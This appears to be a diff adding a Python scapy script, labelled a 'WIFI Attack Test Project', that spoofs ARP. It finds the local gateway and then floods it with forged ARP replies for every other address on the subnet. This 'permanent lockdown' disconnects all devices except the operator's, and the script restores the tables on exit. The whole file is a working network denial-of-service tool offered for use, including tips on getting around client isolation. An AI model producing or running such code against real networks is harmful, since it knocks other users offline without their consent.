@@ -1,0 +1,191 @@
+import os
+import re
+import time
+import threading
+import subprocess
+import logging
+from scapy.all import ARP, Ether, sendp, conf, srp
+
+logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
+
+def get_network_info():
+    """Detects local IP and Gateway."""
+    try:
+        cmd = subprocess.check_output("ipconfig", shell=True).decode()
+        gateway, my_ip = "", ""
+        for line in cmd.split('\n'):
+            if "IPv4 Address" in line:
+                my_ip = line.split(":")[-1].strip()
+            if "Default Gateway" in line and ":" in line:
+                val = line.split(":")[-1].strip()
+                if val and val != "0.0.0.0":
+                    gateway = val
+        return gateway, my_ip
+    except:
+        return None, None
+
+def get_local_mac():
+    """Gets own MAC from ipconfig (more reliable than ARP for own IP)."""
+    try:
+        cmd = subprocess.check_output("getmac /fo csv /nh", shell=True).decode()
+        for line in cmd.split('\n'):
+            if '"' in line:
+                mac = line.split('"')[1]
+                if mac and mac != "N/A" and "-" in mac:
+                    return mac.replace("-", ":").lower()
+    except:
+        pass
+    try:
+        cmd = subprocess.check_output("ipconfig /all", shell=True).decode()
+        capture = False
+        for line in cmd.split('\n'):
+            if "Physical Address" in line and "Physical Address" not in line[:20]:
+                mac = line.split(":")[-1].strip().replace("-", ":").lower()
+                if mac and mac != "00-00-00-00-00-00":
+                    return mac
+    except:
+        pass
+    return None
+
+def get_mac_arp(ip, retries=3):
+    """Resolves a MAC via ARP with multiple retries."""
+    for attempt in range(retries):
+        try:
+            ans, _ = srp(
+                Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip),
+                timeout=3, verbose=False
+            )
+            if ans:
+                return ans[0][1].hwsrc.lower()
+        except:
+            pass
+    return None
+
+def get_mac_arp_table(ip):
+    """Reads MAC from Windows ARP table cache."""
+    try:
+        cmd = subprocess.check_output("arp -a", shell=True).decode()
+        for line in cmd.split('\n'):
+            if ip in line:
+                parts = line.split()
+                for part in parts:
+                    if re.match(r'^[0-9a-f]{2}[-][0-9a-f]{2}[-][0-9a-f]{2}[-][0-9a-f]{2}[-][0-9a-f]{2}[-][0-9a-f]{2}$', part, re.IGNORECASE):
+                        return part.replace("-", ":").lower()
+    except:
+        pass
+    return None
+
+def populate_arp(ip):
+    """Pings target to force ARP resolution into the cache."""
+    subprocess.run(f"ping -n 1 -w 1000 {ip}", shell=True,
+                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+
+def get_mac_with_fallback(ip):
+    """Ping first to populate ARP cache, then read from cache."""
+    print(f"    [*] Pinging {ip} to populate ARP cache...")
+    populate_arp(ip)
+
+    print(f"    [*] Reading MAC from ARP table...")
+    mac = get_mac_arp_table(ip)
+    if mac and mac != "ff:ff:ff:ff:ff:ff":
+        return mac
+
+    print(f"    [*] ARP cache miss. Trying ARP broadcast...")
+    mac = get_mac_arp(ip, retries=3)
+    if mac and mac != "ff:ff:ff:ff:ff:ff":
+        return mac
+
+    return None
+
+def lockdown_thread(start, end, prefix, gateway, my_ip, gateway_mac, my_mac):
+    """
+    PERMANENT LOCKDOWN:
+    Poisons gateway ARP cache only (unicast, no broadcast).
+    """
+    while True:
+        for i in range(start, end):
+            target_ip = f"{prefix}{i}"
+
+            if target_ip == my_ip or target_ip == gateway:
+                continue
+
+            pkt_to_router = Ether(src=my_mac, dst=gateway_mac)/ARP(op=2, pdst=gateway, psrc=target_ip, hwsrc=my_mac)
+            sendp(pkt_to_router, verbose=False)
+
+        time.sleep(0.1)
+
+def restore_arp(gateway, my_ip, gateway_mac, my_mac, prefix):
+    """Sends correct ARP replies to restore all caches on shutdown."""
+    print("[*] Restoring ARP tables...")
+    for i in range(1, 255):
+        target_ip = f"{prefix}{i}"
+        if target_ip == my_ip or target_ip == gateway:
+            continue
+        pkt_target = Ether(src=gateway_mac, dst="ff:ff:ff:ff:ff:ff")/ARP(op=2, pdst=target_ip, psrc=gateway, hwsrc=gateway_mac)
+        sendp(pkt_target, verbose=False)
+    print("[+] ARP tables restored.")
+
+def main():
+    print("=== WIFI Attack Test Project ===")
+
+    gateway, my_ip = get_network_info()
+    if not gateway or not my_ip:
+        print("[X] Gateway or IP not detected. Check your network connection.")
+        return
+
+    print(f"Your IP is {my_ip} | Gateway: {gateway}")
+
+    print("[*] Locking Hardware IDs...")
+
+    g_mac = get_mac_with_fallback(gateway)
+    my_mac = get_local_mac()
+
+    if not my_mac:
+        print("[X] Failed to get your MAC address.")
+        return
+
+    print(f"    Your MAC:    {my_mac}")
+
+    if not g_mac:
+        print("[X] Failed to get Gateway MAC.")
+        print("[X] This usually means AP/Client Isolation is enabled on your WiFi.")
+        print("[X] ARP spoofing will NOT work with client isolation.")
+        print("[X] Solutions:")
+        print("    1. Use an ETHERNET cable instead of WiFi")
+        print("    2. Disable AP Isolation in your router settings")
+        print("    3. Connect to a different network without isolation")
+        return
+
+    if g_mac == "ff:ff:ff:ff:ff:ff":
+        print("[X] Gateway MAC resolved to broadcast address. Attack will not work.")
+        return
+
+    print(f"    Gateway MAC: {g_mac}")
+
+    prefix = ".".join(gateway.split('.')[:-1]) + "."
+
+    print(f"\n[!!!] DISCONNECTING ALL EXCEPT {my_ip}")
+    confirm = input("Should I Activate Permanent Lockdown? (y/n): ")
+
+    if confirm.lower() == 'y':
+        print(f"\n[*] Lockdown Active. Frequency: 0.1s. Your IP is protected.")
+        print("[*] Press Ctrl+C to stop.")
+
+        num_threads = 8
+        step = 256 // num_threads
+        for i in range(num_threads):
+            start = 1 + i * step
+            end = start + step if i < num_threads - 1 else 255
+            t = threading.Thread(target=lockdown_thread, args=(start, end, prefix, gateway, my_ip, g_mac, my_mac))
+            t.daemon = True
+            t.start()
+
+        try:
+            while True:
+                time.sleep(1)
+        except KeyboardInterrupt:
+            print("\n[!] Attack Stopped.")
+            restore_arp(gateway, my_ip, g_mac, my_mac, prefix)
+
+if __name__ == "__main__":
+    main()
